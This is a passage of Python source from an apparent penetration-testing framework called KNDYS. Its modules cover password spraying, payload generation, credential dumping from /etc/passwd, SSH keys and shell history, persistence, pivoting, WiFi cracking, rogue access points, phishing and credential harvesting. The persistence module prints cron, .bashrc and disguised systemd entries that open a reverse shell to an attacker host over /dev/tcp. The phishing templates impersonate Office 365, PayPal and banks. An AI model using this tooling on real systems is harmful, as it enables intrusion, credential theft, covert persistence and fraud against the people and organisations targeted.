        elif passwords_file and not self.find_wordlist_entry(passwords_file, 'password'):
            print(f"{Fore.YELLOW}[!] Wordlist not found: {passwords_file}. Using built-in list.{Style.RESET_ALL}")
        
        found = []
        
        # Test each password against all users
        for password in passwords[:10]:  # Limit to 10 passwords for demo
            print(f"{Fore.BLUE}[*] Spraying password: {password}{Style.RESET_ALL}")
            
            for username in usernames[:20]:  # Limit to 20 users for demo
                print(f"  Testing: {username}:{password}")
                
                # Simulate attack (actual implementation depends on service)
                # This is a placeholder - you would implement actual authentication here
                time.sleep(0.1)
                
                # Random success for demo
                if random.random() < 0.01:  # 1% chance for demo
                    found.append((username, password))
                    print(f"{Fore.GREEN}[+] Valid credentials: {username}:{password}{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}[*] Waiting {delay} seconds before next password...{Style.RESET_ALL}")
            time.sleep(delay)
        
        print(f"\n{Fore.CYAN}[*] Password spray completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} valid credentials:{Style.RESET_ALL}")
            for username, password in found:
                print(f"  {username}:{password}")
        else:
            print(f"{Fore.YELLOW}[*] No valid credentials found{Style.RESET_ALL}")
    
    # ============ TOOLS ============
    
    def run_report_generator(self):
        """Generate professional pentest report"""
        report_format = self.module_options.get('format', 'html')
        template = self.module_options.get('template', 'default')
        output = self.module_options.get('output', 'pentest_report')
        
        print(f"{Fore.CYAN}[*] Generating pentest report{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Format: {report_format}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}\n")
        
        # Sample data for report
        findings = [
            {
                'title': 'SQL Injection Vulnerability',
                'severity': 'High',
                'description': 'SQL injection found in login form',
                'impact': 'Complete database compromise',
                'remediation': 'Use parameterized queries'
            },
            {
                'title': 'Weak Password Policy',
                'severity': 'Medium',
                'description': 'No password complexity requirements',
                'impact': 'Increased risk of account takeover',
                'remediation': 'Implement strong password policy'
            },
            {
                'title': 'Missing Security Headers',
                'severity': 'Low',
                'description': 'Missing X-Frame-Options and CSP headers',
                'impact': 'Increased risk of clickjacking',
                'remediation': 'Add security headers'
            }
        ]
        
        if report_format == 'html':
            # Generate HTML report
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - {datetime.now().strftime('%Y-%m-%d')}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; }}
        .finding {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #3498db; }}
        .severity {{ font-weight: bold; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Test Report</h1>
        <p>Generated by KNDYS Framework on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <h2>Executive Summary</h2>
    <p>This report summarizes the findings from the penetration test conducted on the target systems.</p>
    
    <h2>Findings</h2>
"""
            
            for finding in findings:
                html_content += f"""
    <div class="finding {finding['severity'].lower()}">
        <h3>{finding['title']}</h3>
        <p class="severity">Severity: {finding['severity']}</p>
        <p><strong>Description:</strong> {finding['description']}</p>
        <p><strong>Impact:</strong> {finding['impact']}</p>
        <p><strong>Remediation:</strong> {finding['remediation']}</p>
    </div>
"""
            
            html_content += """
    <h2>Recommendations</h2>
    <ul>
        <li>Address all high severity findings immediately</li>
        <li>Implement regular security assessments</li>
        <li>Establish incident response procedures</li>
    </ul>
</body>
</html>
"""
            
            output_file = f"{output}.html"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"{Fore.GREEN}[+] HTML report generated: {output_file}{Style.RESET_ALL}")
        
        elif report_format == 'txt':
            # Generate text report
            txt_content = f"""
PENETRATION TEST REPORT
========================
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tool: KNDYS Framework

FINDINGS
========
"""
            
            for finding in findings:
                txt_content += f"""
[{finding['severity'].upper()}] {finding['title']}
Description: {finding['description']}
Impact: {finding['impact']}
Remediation: {finding['remediation']}
"""
            
            output_file = f"{output}.txt"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(txt_content)
            
            print(f"{Fore.GREEN}[+] Text report generated: {output_file}{Style.RESET_ALL}")
        
        else:
            print(f"{Fore.RED}[!] Unsupported report format: {report_format}{Style.RESET_ALL}")
    
    # ============ UTILITY FUNCTIONS ============
    
    def show_help(self):
        """Display help"""
        help_text = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║           KNDYS FRAMEWORK HELP                   ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}┌─[ CORE COMMANDS ]───────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.GREEN}help{Fore.WHITE}                    Show this help menu
│ {Fore.GREEN}clear{Fore.WHITE}                   Clear terminal screen
│ {Fore.GREEN}exit{Fore.WHITE} / {Fore.GREEN}quit{Fore.WHITE}            Exit the framework
{Fore.YELLOW}└─────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ MODULE MANAGEMENT ]───────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.GREEN}show modules{Fore.WHITE}            List all modules
│ {Fore.GREEN}show modules <cat>{Fore.WHITE}      List modules by category
│ {Fore.GREEN}use <module>{Fore.WHITE}            Select a module
│ {Fore.GREEN}options{Fore.WHITE}                 Show module options
│ {Fore.GREEN}set <opt> <val>{Fore.WHITE}         Configure module option
│ {Fore.GREEN}run{Fore.WHITE}                     Execute current module
│ {Fore.GREEN}back{Fore.WHITE}                    Return to main menu
{Fore.YELLOW}└─────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ WORDLIST TOOLS ]─────────────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.GREEN}show wordlists{Fore.WHITE}          List available dictionaries
│ {Fore.GREEN}download wordlist <id>{Fore.WHITE}  Fetch password lists
{Fore.YELLOW}└───────────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ ADVANCED TOOLS ]─────────────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.GREEN}search exploits <q>{Fore.WHITE}     Search exploit database
│ {Fore.GREEN}show payloads{Fore.WHITE}           List payload generators
│ {Fore.GREEN}generate payload{Fore.WHITE}        Create custom payload
{Fore.YELLOW}└───────────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ CONFIGURATION ]──────────────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.GREEN}setg <opt> <val>{Fore.WHITE}        Set global configuration
│ {Fore.GREEN}stats{Fore.WHITE}                   Show framework statistics
│ {Fore.GREEN}sessions{Fore.WHITE}                List active sessions
{Fore.YELLOW}└───────────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ MODULE CATEGORIES ]──────────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.CYAN}recon{Fore.WHITE}       Information gathering & reconnaissance
│ {Fore.CYAN}scan{Fore.WHITE}        Vulnerability detection & scanning
│ {Fore.CYAN}exploit{Fore.WHITE}     Exploitation frameworks & tools
│ {Fore.CYAN}post{Fore.WHITE}        Post-exploitation utilities
│ {Fore.CYAN}password{Fore.WHITE}    Credential attacks & cracking
│ {Fore.CYAN}wireless{Fore.WHITE}    WiFi & wireless network testing
│ {Fore.CYAN}social{Fore.WHITE}      Social engineering campaigns {Fore.GREEN}[9 modules]{Fore.WHITE}
│ {Fore.CYAN}network{Fore.WHITE}     Network attacks & MITM {Fore.GREEN}[NEW - 5 modules]{Fore.WHITE}
│ {Fore.CYAN}webapp{Fore.WHITE}      Modern web application testing {Fore.GREEN}[NEW - 5 modules]{Fore.WHITE}
│ {Fore.CYAN}report{Fore.WHITE}      Professional reporting tools
{Fore.YELLOW}└───────────────────────────────────────────────────{Style.RESET_ALL}

{Fore.YELLOW}┌─[ USAGE EXAMPLES ]─────────────────────────────────{Style.RESET_ALL}
{Fore.WHITE}│
│ {Fore.BLUE}# Port scanning{Fore.WHITE}
│ {Fore.GREEN}show modules recon
│ use recon/port_scanner
│ set target 192.168.1.1
│ set ports 1-1000
│ run{Fore.WHITE}
│
│ {Fore.BLUE}# Password cracking{Fore.WHITE}
│ {Fore.GREEN}use password/hash_cracker
│ set hash 5f4dcc3b5aa765d61d8327deb882cf99
│ set type md5
│ set wordlist rockyou
│ run{Fore.WHITE}
│
│ {Fore.BLUE}# Reverse shell handler{Fore.WHITE}
│ {Fore.GREEN}use exploit/multi_handler
│ set lhost 192.168.1.100
│ set lport 4444
│ run{Fore.WHITE}
{Fore.YELLOW}└───────────────────────────────────────────────────{Style.RESET_ALL}
"""
        print(help_text)
    
    def search_exploits(self, query):
        """Search exploit database"""
        print(f"{Fore.CYAN}[*] Searching exploits for: {query}{Style.RESET_ALL}")
        
        results = self.exploit_db.search_exploits(query)
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} exploits:{Style.RESET_ALL}")
            for exploit in results:
                print(f"\n{Fore.YELLOW}[{exploit['id']}] {exploit['name']}{Style.RESET_ALL}")
                print(f"  Type: {exploit['type']}")
                print(f"  Port: {exploit['port']}")
                print(f"  Description: {exploit['description']}")
        else:
            print(f"{Fore.YELLOW}[*] No exploits found for: {query}{Style.RESET_ALL}")
    
    def show_payloads(self):
        """Show available payloads"""
        print(f"{Fore.CYAN}{Style.BRIGHT}[ AVAILABLE PAYLOADS ]{Style.RESET_ALL}\n")
        
        for category, payloads in self.payload_gen.payloads.items():
            print(f"{Fore.YELLOW}{category.upper()}:{Style.RESET_ALL}")
            for payload_type in payloads.keys():
                print(f"  {Fore.GREEN}{payload_type}{Style.RESET_ALL}")
            print()
    
    def generate_payload(self):
        """Generate payload interactively"""
        print(f"{Fore.CYAN}[*] Payload Generator{Style.RESET_ALL}")
        
        payload_type = input(f"{Fore.YELLOW}Payload type (reverse_shell/bind_shell/web_shell): {Style.RESET_ALL}").strip()
        platform = input(f"{Fore.YELLOW}Platform (bash/python/php/powershell): {Style.RESET_ALL}").strip()
        
        if payload_type == 'reverse_shell':
            lhost = input(f"{Fore.YELLOW}LHOST [{self.config['lhost']}]: {Style.RESET_ALL}").strip() or self.config['lhost']
            lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
            
            payload = self.payload_gen.generate(payload_type, platform, LHOST=lhost, LPORT=lport)
            
        elif payload_type == 'bind_shell':
            lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
            payload = self.payload_gen.generate(payload_type, platform, LPORT=lport)
            
        else:
            payload = self.payload_gen.generate(payload_type, platform)

        if payload:
            print(f"\n{Fore.GREEN}[+] Generated payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}")

            # Save to file
            save = input(f"\n{Fore.YELLOW}Save to file? (y/n): {Style.RESET_ALL}").strip().lower()
            if save == 'y':
                filename = input(f"{Fore.YELLOW}Filename [payload.txt]: {Style.RESET_ALL}").strip() or 'payload.txt'
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(payload)
                print(f"{Fore.GREEN}[+] Payload saved to: {filename}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Failed to generate payload{Style.RESET_ALL}")
    
    # ============ POST-EXPLOITATION MODULES ============
    
    def run_shell(self):
        """Interactive system shell with command sanitization"""
        session_id = self.module_options.get('session', '1')
        command = self.module_options.get('command', 'whoami')
        
        print(f"{Fore.CYAN}[*] Opening shell session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Type 'exit' to close shell{Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ  Commands are sanitized for security{Style.RESET_ALL}\n")
        
        # Get or create session
        session_data = self.session_manager.get_session(session_id)
        if not session_data:
            session_data = self.session_manager.create_session(session_id, {'commands': []})
        
        print(f"{Fore.GREEN}[+] Shell session opened{Style.RESET_ALL}")
        
        # Allowed safe commands
        safe_commands = ['ls', 'pwd', 'whoami', 'id', 'uname', 'date', 'hostname', 
                        'ps', 'netstat', 'ifconfig', 'ip', 'cat', 'head', 'tail',
                        'grep', 'find', 'which', 'echo', 'env']
        
        while True:
            try:
                cmd = input(f"{Fore.CYAN}shell@session{session_id}>{Style.RESET_ALL} ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                if cmd:
                    # Parse command
                    cmd_parts = cmd.split()
                    if not cmd_parts:
                        continue
                    
                    base_cmd = cmd_parts[0]
                    
                    # Check if command is in safe list
                    if base_cmd not in safe_commands:
                        print(f"{Fore.RED}[!] Command '{base_cmd}' not allowed{Style.RESET_ALL}")
                        print(f"{Fore.BLUE}ℹ  Allowed commands: {', '.join(safe_commands[:10])}...{Style.RESET_ALL}")
                        continue
                    
                    # Sanitize command
                    sanitized = self.validator.sanitize_command(cmd)
                    if not sanitized:
                        print(f"{Fore.RED}[!] Command contains dangerous characters{Style.RESET_ALL}")
                        continue
                    
                    # Execute with timeout and proper error handling
                    try:
                        result = subprocess.run(
                            cmd_parts,  # Use list instead of string for safety
                            capture_output=True, 
                            text=True, 
                            timeout=10,
                            shell=False  # NEVER use shell=True
                        )
                        
                        if result.stdout:
                            print(result.stdout)
                        if result.stderr:
                            print(f"{Fore.RED}{result.stderr}{Style.RESET_ALL}")
                        
                        # Log command
                        session_data['commands'].append({
                            'cmd': cmd,
                            'timestamp': time.time(),
                            'success': result.returncode == 0
                        })
                        
                    except subprocess.TimeoutExpired:
                        print(f"{Fore.RED}[!] Command timeout (10s limit){Style.RESET_ALL}")
                    except FileNotFoundError:
                        print(f"{Fore.RED}[!] Command not found: {base_cmd}{Style.RESET_ALL}")
                    except Exception as e:
                        self.error_handler.handle_error(e, f"Executing command: {cmd}")
                        
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Interrupted{Style.RESET_ALL}")
                break
        
        # Close session
        self.session_manager.close_session(session_id)
        print(f"{Fore.YELLOW}[*] Shell session closed{Style.RESET_ALL}")
    
    def run_file_explorer(self):
        """Remote file system explorer"""
        session_id = self.module_options.get('session', '1')
        path = self.module_options.get('path', '/')
        
        print(f"{Fore.CYAN}[*] Exploring filesystem on session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Path: {path}{Style.RESET_ALL}\n")
        
        try:
            # List directory contents
            if os.path.exists(path):
                print(f"{Fore.GREEN}[+] Directory contents:{Style.RESET_ALL}\n")
                
                items = os.listdir(path)
                for item in sorted(items):
                    full_path = os.path.join(path, item)
                    if os.path.isdir(full_path):
                        print(f"{Fore.BLUE}[DIR]  {item}/{Style.RESET_ALL}")
                    else:
                        size = os.path.getsize(full_path)
                        print(f"{Fore.GREEN}[FILE] {item} ({size} bytes){Style.RESET_ALL}")
                
                print(f"\n{Fore.YELLOW}[*] Total items: {len(items)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Path not found: {path}{Style.RESET_ALL}")
        except PermissionError:
            print(f"{Fore.RED}[!] Permission denied: {path}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def run_privilege_escalation(self):
        """Automated privilege escalation checks"""
        session_id = self.module_options.get('session', '1')
        check_type = self.module_options.get('check', 'all')
        
        print(f"{Fore.CYAN}[*] Running privilege escalation checks on session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Check type: {check_type}{Style.RESET_ALL}\n")
        
        checks = []
        
        # SUID binaries check
        print(f"{Fore.BLUE}[*] Checking for SUID binaries...{Style.RESET_ALL}")
        try:
            result = subprocess.run("find / -perm -4000 -type f 2>/dev/null | head -20", 
                                  shell=True, capture_output=True, text=True, timeout=10)
            if result.stdout:
                checks.append(("SUID Binaries", result.stdout.strip().split('\n')))
                print(f"{Fore.GREEN}[+] Found SUID binaries{Style.RESET_ALL}")
        except:
            pass
        
        # Writable directories
        print(f"{Fore.BLUE}[*] Checking for writable directories...{Style.RESET_ALL}")
        writable = []
        for dir_path in ['/tmp', '/var/tmp', '/dev/shm', '/home']:
            if os.path.exists(dir_path) and os.access(dir_path, os.W_OK):
                writable.append(dir_path)
        if writable:
            checks.append(("Writable Directories", writable))
            print(f"{Fore.GREEN}[+] Found {len(writable)} writable directories{Style.RESET_ALL}")
        
        # Sudo privileges
        print(f"{Fore.BLUE}[*] Checking sudo privileges...{Style.RESET_ALL}")
        try:
            result = subprocess.run("sudo -l 2>/dev/null", shell=True, capture_output=True, text=True, timeout=5)
            if result.stdout and 'may run' in result.stdout.lower():
                checks.append(("Sudo Privileges", result.stdout.strip()))
                print(f"{Fore.GREEN}[+] User has sudo privileges{Style.RESET_ALL}")
        except:
            pass
        
        # Cron jobs
        print(f"{Fore.BLUE}[*] Checking cron jobs...{Style.RESET_ALL}")
        cron_files = ['/etc/crontab', '/var/spool/cron/crontabs']
        for cron_file in cron_files:
            if os.path.exists(cron_file):
                checks.append(("Cron Jobs", cron_file))
                print(f"{Fore.GREEN}[+] Found cron file: {cron_file}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Privilege escalation check completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Total findings: {len(checks)}{Style.RESET_ALL}")
        
        # Save results
        report = f"privesc_check_{int(time.time())}.txt"
        with open(report, 'w') as f:
            for check_name, check_data in checks:
                f.write(f"\n[{check_name}]\n")
                if isinstance(check_data, list):
                    for item in check_data:
                        f.write(f"  {item}\n")
                else:
                    f.write(f"{check_data}\n")
        print(f"{Fore.GREEN}[+] Results saved to: {report}{Style.RESET_ALL}")
    
    def run_credential_dumper(self):
        """Extract credentials from compromised system"""
        session_id = self.module_options.get('session', '1')
        target_os = self.module_options.get('os', 'linux')
        
        print(f"{Fore.CYAN}[*] Dumping credentials from session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target OS: {target_os}{Style.RESET_ALL}\n")
        
        credentials = []
        
        if target_os == 'linux':
            # Check /etc/passwd and /etc/shadow
            print(f"{Fore.BLUE}[*] Checking /etc/passwd...{Style.RESET_ALL}")
            if os.path.exists('/etc/passwd'):
                with open('/etc/passwd', 'r') as f:
                    users = [line.split(':')[0] for line in f if not line.startswith('#')]
                    credentials.append(("System Users", users[:10]))
                    print(f"{Fore.GREEN}[+] Found {len(users)} users{Style.RESET_ALL}")
            
            # Check SSH keys
            print(f"{Fore.BLUE}[*] Checking for SSH keys...{Style.RESET_ALL}")
            ssh_paths = [os.path.expanduser('~/.ssh'), '/root/.ssh']
            for ssh_path in ssh_paths:
                if os.path.exists(ssh_path):
                    keys = [f for f in os.listdir(ssh_path) if 'id_' in f]
                    if keys:
                        credentials.append(("SSH Keys", [os.path.join(ssh_path, k) for k in keys]))
                        print(f"{Fore.GREEN}[+] Found SSH keys in {ssh_path}{Style.RESET_ALL}")
            
            # Check for credentials in common files
            print(f"{Fore.BLUE}[*] Searching for credentials in config files...{Style.RESET_ALL}")
            config_files = ['.bashrc', '.bash_history', '.mysql_history', '.config']
            home = os.path.expanduser('~')
            for config_file in config_files:
                config_path = os.path.join(home, config_file)
                if os.path.exists(config_path) and os.path.isfile(config_path):
                    try:
                        with open(config_path, 'r', errors='ignore') as f:
                            content = f.read()
                            # Look for passwords
                            if 'password' in content.lower() or 'passwd' in content.lower():
                                credentials.append(("Config File", config_path))
                                print(f"{Fore.YELLOW}[!] Potential credentials in {config_file}{Style.RESET_ALL}")
                    except:
                        pass
        
        elif target_os == 'windows':
            print(f"{Fore.YELLOW}[*] Windows credential dumping requires SYSTEM privileges{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Checking for credential files...{Style.RESET_ALL}")
            
            # Common credential locations on Windows
            win_paths = [
                'C:\\Windows\\System32\\config\\SAM',
                'C:\\Windows\\System32\\config\\SYSTEM',
                'C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials'
            ]
            
            for path in win_paths:
                print(f"  {path}")
        
        print(f"\n{Fore.CYAN}[*] Credential dump completed{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found {len(credentials)} credential sources{Style.RESET_ALL}")
        
        # Save results
        output = f"credentials_{int(time.time())}.txt"
        with open(output, 'w') as f:
            for cred_type, cred_data in credentials:
                f.write(f"\n[{cred_type}]\n")
                if isinstance(cred_data, list):
                    for item in cred_data:
                        f.write(f"  {item}\n")
                else:
                    f.write(f"{cred_data}\n")
        print(f"{Fore.YELLOW}[*] Results saved to: {output}{Style.RESET_ALL}")
    
    def run_persistence(self):
        """Establish persistence on compromised system"""
        session_id = self.module_options.get('session', '1')
        method = self.module_options.get('method', 'cron')
        
        print(f"{Fore.CYAN}[*] Establishing persistence on session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}\n")
        
        if method == 'cron':
            print(f"{Fore.BLUE}[*] Cron job persistence method{Style.RESET_ALL}")
            cron_entry = f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{self.config['lhost']}/4444 0>&1'"
            print(f"{Fore.YELLOW}[*] Cron entry:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{cron_entry}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[*] To install: (crontab -l 2>/dev/null; echo \"{cron_entry}\") | crontab -{Style.RESET_ALL}")
        
        elif method == 'service':
            print(f"{Fore.BLUE}[*] Systemd service persistence method{Style.RESET_ALL}")
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{self.config['lhost']}/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target"""
            print(f"{Fore.CYAN}{service_content}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[*] Save to: /etc/systemd/system/update-service.service{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Enable: systemctl enable update-service{Style.RESET_ALL}")
        
        elif method == 'bashrc':
            print(f"{Fore.BLUE}[*] .bashrc persistence method{Style.RESET_ALL}")
            bashrc_entry = f"bash -i >& /dev/tcp/{self.config['lhost']}/4444 0>&1 &"
            print(f"{Fore.YELLOW}[*] Append to ~/.bashrc:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{bashrc_entry}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Persistence setup information generated{Style.RESET_ALL}")
    
    def run_pivot(self):
        """Network pivoting and lateral movement"""
        session_id = self.module_options.get('session', '1')
        target_network = self.module_options.get('target', '192.168.2.0/24')
        
        print(f"{Fore.CYAN}[*] Setting up pivot from session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target network: {target_network}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Pivot techniques:{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}1. SSH Port Forwarding:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Local:  ssh -L 8080:target:80 user@pivot{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Remote: ssh -R 8080:localhost:80 user@pivot{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Dynamic: ssh -D 9050 user@pivot{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}2. Chisel (HTTP Tunneling):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Server: ./chisel server -p 8080 --reverse{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Client: ./chisel client {self.config['lhost']}:8080 R:socks{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}3. Metasploit autoroute:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   run autoroute -s {target_network}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   run autoroute -p{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Pivot setup information generated{Style.RESET_ALL}")
    
    # ============ WIRELESS MODULES ============
    
    def run_wifi_scanner(self):
        """WiFi network scanner"""
        interface = self.module_options.get('interface', 'wlan0')
        channel = self.module_options.get('channel', 'all')
        
        print(f"{Fore.CYAN}[*] Scanning WiFi networks{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Interface: {interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED}[!] Scapy not available. Install with: pip install scapy{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}[!] WiFi scanning requires monitor mode and root privileges{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Commands to enable monitor mode:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   sudo ifconfig {interface} down{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   sudo iwconfig {interface} mode monitor{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   sudo ifconfig {interface} up{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[*] WiFi scanner ready (requires root to capture){Style.RESET_ALL}")
    
    def run_wifi_cracker(self):
        """WPA/WPA2 handshake cracker"""
        handshake_file = self.module_options.get('handshake', 'capture.pcap')
        wordlist = self.module_options.get('wordlist', 'rockyou.txt')
        bssid = self.module_options.get('bssid', '00:11:22:33:44:55')
        
        print(f"{Fore.CYAN}[*] WPA/WPA2 handshake cracker{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Handshake: {handshake_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] BSSID: {bssid}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Using aircrack-ng:{Style.RESET_ALL}")
        command = f"aircrack-ng -w {wordlist} -b {bssid} {handshake_file}"
        print(f"{Fore.CYAN}{command}{Style.RESET_ALL}")
        
        if os.path.exists(handshake_file) and os.path.exists(wordlist):
            print(f"\n{Fore.YELLOW}[*] Files found, attempting crack...{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] This may take a long time depending on wordlist size{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] Handshake or wordlist file not found{Style.RESET_ALL}")
    
    def run_rogue_ap(self):
        """Rogue access point creator"""
        interface = self.module_options.get('interface', 'wlan0')
        ssid = self.module_options.get('ssid', 'Free_WiFi')
        channel = self.module_options.get('channel', '6')
        
        print(f"{Fore.CYAN}[*] Creating rogue access point{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Interface: {interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] SSID: {ssid}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Using hostapd configuration:{Style.RESET_ALL}")
        hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"""
        
        print(f"{Fore.CYAN}{hostapd_conf}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] Save config to hostapd.conf and run: hostapd hostapd.conf{Style.RESET_ALL}")
    
    # ============ SOCIAL ENGINEERING MODULES ============
    
    def run_phishing(self):
        """Phishing campaign creator"""
        template = self.module_options.get('template', 'office365')
        targets_file = self.module_options.get('targets', 'emails.txt')
        smtp_server = self.module_options.get('server', 'smtp.gmail.com')
        
        print(f"{Fore.CYAN}[*] Phishing campaign creator{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Targets: {targets_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] SMTP Server: {smtp_server}{Style.RESET_ALL}\n")
        
        templates = {
            'office365': {
                'subject': 'Password Expiration Notice',
                'body': 'Your Office 365 password will expire in 24 hours. Please verify your account.'
            },
            'paypal': {
                'subject': 'Unusual Activity Detected',
                'body': 'We detected unusual activity in your PayPal account. Please verify your information.'
            },
            'banking': {
                'subject': 'Security Alert',
                'body': 'Your account has been locked due to suspicious activity. Please confirm your identity.'
            }
        }
        
        if template in templates:
            print(f"{Fore.GREEN}[+] Email template:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Subject: {templates[template]['subject']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Body: {templates[template]['body']}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}[*] Set up credential harvester first with: use social/credential_harvester{Style.RESET_ALL}")
    
    def run_credential_harvester(self):
        """Credential harvesting server"""
        port = self.module_options.get('port', '80')
        template = self.module_options.get('template', 'facebook')
        redirect_url = self.module_options.get('redirect', 'https://facebook.com')
        
        print(f"{Fore.CYAN}[*] Starting credential harvester{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Port: {port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Redirect: {redirect_url}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Simple Python HTTP server with logging:{Style.RESET_ALL}")
        
        server_code = f"""
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs

class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"[+] Captured credentials: {{post_data.decode()}}")
        
        # Log to file
        with open('captured_creds.txt', 'a') as f:
